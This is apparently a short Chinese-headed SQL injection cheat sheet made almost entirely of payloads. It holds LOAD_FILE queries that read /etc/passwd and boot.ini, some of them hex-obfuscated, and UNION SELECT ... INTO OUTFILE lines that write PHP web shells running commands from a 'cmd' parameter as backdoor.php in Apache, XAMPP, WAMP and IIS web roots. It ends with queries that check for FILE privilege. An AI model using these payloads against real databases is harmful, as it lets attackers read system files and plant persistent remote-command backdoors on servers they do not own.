## 读写文件
```sql
SELECT LOAD_FILE('/etc/passwd') --
UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

## 读取混淆
```sql
SELECT LOAD_FILE(0x633A5C626F6F742E696E69)
select load_file(c:\boot.ini)
```

## 文件权限
```sql
SELECT file_priv FROM mysql.user WHERE user = 'snowwolf'
SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%snowwolf%'
```
